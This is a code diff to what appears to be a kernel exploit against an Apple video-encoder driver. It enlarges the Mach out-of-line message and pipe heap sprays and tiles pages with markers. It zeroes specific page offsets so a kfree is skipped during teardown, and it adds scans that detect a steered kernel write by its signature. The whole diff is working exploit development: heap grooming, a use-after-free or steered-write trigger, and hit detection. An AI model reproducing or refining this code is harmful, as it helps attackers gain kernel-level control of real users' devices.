@@ -386,14 +386,21 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     [report appendFormat:@"fixed-page spray: %ld surfaces\n",
      surfArray ? (long)CFArrayGetCount(surfArray) : 0L];
 
+    // kfree-chain-safe tile: if the steered write lands here, teardown reads N at
+    // P+0x48 and X1 at P+0x50 (page-local 0x49/0x51). Zeroing page offsets 0x48/0x50
+    // forces X1=NULL so the kfree is skipped (cbz) — a hit stays a clean signature.
     uint8_t *tile = (uint8_t *)malloc(256 * 1024);
     if (tile) {
         uint64_t *tq = (uint64_t *)tile;
         for (size_t ti = 0; ti < 256 * 1024 / 8; ti++) tq[ti] = markerPair;
+        for (size_t pg = 0; pg < 256 * 1024; pg += 4096) {
+            *(uint64_t *)(tile + pg + 0x48) = 0;
+            *(uint64_t *)(tile + pg + 0x50) = 0;
+        }
     }
-    mach_port_t oolPorts[64];
+    mach_port_t oolPorts[128];
     int oolPortCount = 0, oolQueued = 0;
-    for (int p = 0; p < 64; p++) {
+    for (int p = 0; p < 128; p++) {
         oolPorts[p] = MACH_PORT_NULL;
         if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &oolPorts[p]) != KERN_SUCCESS) continue;
         mach_port_insert_right(mach_task_self(), oolPorts[p], oolPorts[p], MACH_MSG_TYPE_MAKE_SEND);
@@ -401,7 +408,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     }
     if (tile && oolPortCount) {
         for (int p = 0; p < oolPortCount; p++) {
-            for (int m = 0; m < 4; m++) {
+            for (int m = 0; m < 8; m++) {
                 size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t);
                 uint8_t *msg = calloc(1, total);
                 mach_msg_header_t *hdr = (mach_msg_header_t *)msg;
@@ -428,16 +435,21 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     }
     [report appendFormat:@"ool kernel-copy spray: %d ports, %d queued x 256KB\n", oolPortCount, oolQueued];
 
-    int pipeFds[48][2];
+    int pipeFds[64][2];
     int pipesMade = 0;
-    for (int p = 0; p < 48; p++) {
+    for (int p = 0; p < 64; p++) {
         pipeFds[p][0] = pipeFds[p][1] = -1;
         if (pipe(pipeFds[p]) != 0) continue;
-        fcntl(pipeFds[p][1], F_SETPIPE_SZ, 256 * 1024); // ignored if unsupported
+        fcntl(pipeFds[p][1], F_SETPIPE_SZ, 512 * 1024); // ignored if unsupported
         fcntl(pipeFds[p][1], F_SETFL, O_NONBLOCK);
-        if (tile && write(pipeFds[p][1], tile, 256 * 1024) > 0) pipesMade++;
+        ssize_t wsum = 0;
+        if (tile) {
+            wsum += write(pipeFds[p][1], tile, 256 * 1024);
+            wsum += write(pipeFds[p][1], tile, 256 * 1024);
+        }
+        if (wsum > 0) pipesMade++;
     }
-    [report appendFormat:@"pipe spray: %d x 256KB\n", pipesMade];
+    [report appendFormat:@"pipe spray: %d x 512KB\n", pipesMade];
 
     // 3) FIRE FIRST ENCODE AND TEARDOWN VICTIM BEFORE SCANNING SPRAY
     //    Confirmed by static RE (AVE-112705-EXPLOIT.md Section 4):
@@ -519,7 +531,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
 
     // Read back OOL queues and pipes: a landed stp write shows as the signature
     // [x0, x0, x0, 0] embedded in the marker-tiled content (or any non-marker mutation).
-    int oolHits = 0, pipeHits = 0;
+    int oolHits = 0, pipeHits = 0, sigHits = 0;
     for (int p = 0; p < oolPortCount; p++) {
         for (int m = 0; m < 4; m++) {
             size_t rtotal = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t) + 256;
@@ -543,6 +555,23 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                             i3 += 3;
                         }
                     }
+                    uint8_t *ob = (uint8_t *)od->address;
+                    for (size_t pg = 0; pg + 0x78 <= od->size && sigHits < 8; pg += 4096) {
+                        uint64_t s1 = *(uint64_t *)(ob + pg + 0x59);
+                        uint64_t s2 = *(uint64_t *)(ob + pg + 0x61);
+                        uint64_t s3 = *(uint64_t *)(ob + pg + 0x69);
+                        uint32_t z = *(uint32_t *)(ob + pg + 0x71);
+                        if (s1 != markerPair && s1 == s2 && s2 == s3 && z == 0) {
+                            int match = -1;
+                            if (s1 == steeredX0) match = -2;
+                            for (int c = 0; c < ncand; c++) {
+                                if (s1 == x0cands[c]) { match = c; break; }
+                            }
+                            [report appendFormat:@"    OOL SIG p=%d m=%d page=0x%zx s1=0x%llx match=%d\n",
+                             p, m, pg, s1, match];
+                            sigHits++;
+                        }
+                    }
                 }
                 if (od->address) {
                     vm_deallocate(mach_task_self(), (vm_address_t)od->address,
@@ -554,11 +583,11 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         }
         if (oolHits >= 8) break;
     }
-    for (int p = 0; p < 48; p++) {
+    for (int p = 0; p < 64; p++) {
         if (pipeFds[p][0] < 0) continue;
-        uint8_t *pbuf = (uint8_t *)malloc(256 * 1024);
+        uint8_t *pbuf = (uint8_t *)malloc(512 * 1024);
         if (pbuf) {
-            ssize_t got = read(pipeFds[p][0], pbuf, 256 * 1024);
+            ssize_t got = read(pipeFds[p][0], pbuf, 512 * 1024);
             if (got >= 32) {
                 uint64_t *pq = (uint64_t *)pbuf;
                 size_t nq = (size_t)got / 8;
@@ -570,13 +599,29 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                         i3 += 3;
                     }
                 }
+                for (size_t pg = 0; pg + 0x78 <= (size_t)got && sigHits < 8; pg += 4096) {
+                    uint64_t s1 = *(uint64_t *)(pbuf + pg + 0x59);
+                    uint64_t s2 = *(uint64_t *)(pbuf + pg + 0x61);
+                    uint64_t s3 = *(uint64_t *)(pbuf + pg + 0x69);
+                    uint32_t z = *(uint32_t *)(pbuf + pg + 0x71);
+                    if (s1 != markerPair && s1 == s2 && s2 == s3 && z == 0) {
+                        int match = -1;
+                        if (s1 == steeredX0) match = -2;
+                        for (int c = 0; c < ncand; c++) {
+                            if (s1 == x0cands[c]) { match = c; break; }
+                        }
+                        [report appendFormat:@"    PIPE SIG p=%d page=0x%zx s1=0x%llx match=%d\n",
+                         p, pg, s1, match];
+                        sigHits++;
+                    }
+                }
             }
             free(pbuf);
         }
         close(pipeFds[p][0]);
         close(pipeFds[p][1]);
     }
-    [report appendFormat:@"kernel-object scan: ool_hits=%d pipe_hits=%d\n", oolHits, pipeHits];
+    [report appendFormat:@"kernel-object scan: ool_hits=%d pipe_hits=%d sig_hits=%d\n", oolHits, pipeHits, sigHits];
     for (int p = 0; p < oolPortCount; p++) {
         if (oolPorts[p] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), oolPorts[p]);
     }
